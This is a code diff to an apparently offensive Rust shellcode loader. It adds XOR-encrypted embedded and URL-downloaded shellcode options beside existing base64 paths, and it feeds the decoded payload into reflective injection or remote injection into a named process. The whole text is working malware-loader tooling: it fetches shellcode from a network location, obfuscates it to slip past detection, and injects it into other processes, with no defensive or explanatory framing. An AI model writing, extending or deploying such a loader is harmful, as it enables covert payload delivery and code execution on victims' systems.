@@ -1,9 +1,9 @@
 pub mod injectors;
 use injectors::{
-    decode_b64_shellcode, download_shellcode, reflective_inject, remote_inject,
+    decode_b64_shellcode, decrypt_xor, download_shellcode, reflective_inject, remote_inject,
     InjectionType::{self, Reflect, Remote},
     Injector,
-    InjectorType::{self, Base64Embedded, Base64Url, Embedded, Url},
+    InjectorType::{self, Base64Embedded, Base64Url, Embedded, Url, XorEmbedded, XorUrl},
 };
 
 ///
@@ -30,23 +30,27 @@ pub fn load(injector_type: InjectorType) -> Result<Injector, String> {
         Embedded(shellcode) => Ok(Injector { shellcode }),
         Base64Embedded((sc_string, b64_iterations)) => {
             let sc_bytes = sc_string.as_bytes().to_vec();
-            if let Ok(shellcode) = decode_b64_shellcode(&sc_bytes, b64_iterations) {
-                return Ok(Injector { shellcode });
-            }
-            Err("Could not decode shellcode!".to_string())
+            Ok(Injector {
+                shellcode: decode_b64_shellcode(&sc_bytes, b64_iterations)?,
+            })
         }
-        Url(url) => match download_shellcode(&url) {
-            Ok(shellcode) => Ok(Injector { shellcode }),
-            Err(e) => Err(e),
-        },
+        Url(url) => Ok(Injector {
+            shellcode: download_shellcode(&url)?,
+        }),
         Base64Url((url, b64_iterations)) => {
-            if let Ok(b64_shellcode) = download_shellcode(&url) {
-                return match decode_b64_shellcode(&b64_shellcode, b64_iterations) {
-                    Ok(shellcode) => Ok(Injector { shellcode }),
-                    Err(e) => Err(e),
-                };
-            }
-            Err("Could not download encoded shellcode!".to_string())
+            let b64_shellcode: Vec<u8> = download_shellcode(&url)?;
+            Ok(Injector {
+                shellcode: decode_b64_shellcode(&b64_shellcode, b64_iterations)?,
+            })
+        }
+        XorEmbedded((sc_bytes, key)) => Ok(Injector {
+            shellcode: decrypt_xor(&sc_bytes, &key)?,
+        }),
+        XorUrl((url, key)) => {
+            let sc = download_shellcode(&url)?;
+            Ok(Injector {
+                shellcode: decrypt_xor(&sc, &key)?,
+            })
         }
     }
 }
@@ -63,4 +67,3 @@ pub fn inject(injector: Injector, injection_type: InjectionType, wait: bool) -> 
         Remote(proc_name) => unsafe { remote_inject(injector.shellcode, wait, &proc_name) },
     }
 }
-
